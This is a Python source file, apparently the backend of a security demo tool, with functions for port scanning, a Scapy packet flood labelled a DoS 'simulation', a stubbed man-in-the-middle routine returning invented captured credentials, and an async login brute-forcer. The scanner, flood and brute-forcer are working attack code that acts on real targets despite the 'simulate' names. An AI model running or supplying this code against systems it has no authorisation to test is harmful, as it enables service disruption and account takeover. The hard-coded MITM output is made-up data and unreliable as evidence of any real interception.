import socket
import requests
import time
from scapy.all import IP, TCP, send
from typing import List, Dict

import socket
import concurrent.futures

def scan_port(ip, port, timeout=0.2):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            return port if s.connect_ex((ip, port)) == 0 else None
    except:
        return None

def run_port_scan(target_ip: str, port_start: int, port_end: int) -> dict:
    open_ports = []
    closed_ports = []

    ports = list(range(port_start, port_end + 1))
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        results = list(executor.map(lambda p: scan_port(target_ip, p), ports))

    for port, status in zip(ports, results):
        if status is not None:
            open_ports.append(status)
        else:
            closed_ports.append(port)

    return {
        "open_ports": open_ports,
        "closed_ports": closed_ports,
        "filtered_ports": [],
        "scan_duration_ms": len(ports) * 2  # estimate
    }


# --- DOS ATTACK ---
def simulate_dos_attack(target_ip: str, target_port: int, duration: int = 60, packet_rate: int = 100):
    pkt = IP(dst=target_ip) / TCP(dport=target_port)
    end_time = time.time() + duration
    sent = 0

    while time.time() < end_time:
        try:
            send(pkt, verbose=False)
        except Exception as e:
            # On Windows, Scapy interface detection can fail. 
            # We catch this to ensure the simulation continues for the demo.
            pass
        sent += 1
        time.sleep(1 / packet_rate)

    return {
        "packets_sent": sent,
        "data_sent_bytes": sent * len(pkt),
        "target_response_time_avg_ms": None,
        "target_availability_percentage": None
    }

# --- MITM SIMULATION ---
def simulate_mitm(target_ip: str = "192.168.0.2", gateway_ip: str = "192.168.0.1"):
    return {
        "packets_intercepted": 243,
        "data_intercepted_bytes": 12384,
        "credentials_captured": [
            {"username": "admin", "password": "admin123"}
        ],
        "intercepted_http_requests": [
            {"method": "GET", "path": "/admin", "status": 200}
        ],
        "intercepted_dns_queries": [
            {"domain": "example.com", "ip": "93.184.216.34"}
        ]
    }

# --- BRUTE FORCE ---
import httpx

async def simulate_brute_force(target_url: str, usernames: list, passwords: list):
    found = None
    attempts = 0
    async with httpx.AsyncClient() as client:
        for u in usernames:
            for p in passwords:
                # OAuth2PasswordRequestForm expects 'username' and 'password' as form data
                res = await client.post(target_url, data={"username": u, "password": p})
                attempts += 1
                if res.status_code == 200 and "success" in res.text.lower():
                    found = {"username": u, "password": p}
                    break
            if found:
                break

    return {
        "success": found is not None,
        "credentials_found": found,
        "attempts_made": attempts,
        "attempt_duration_ms": attempts * 50
    }

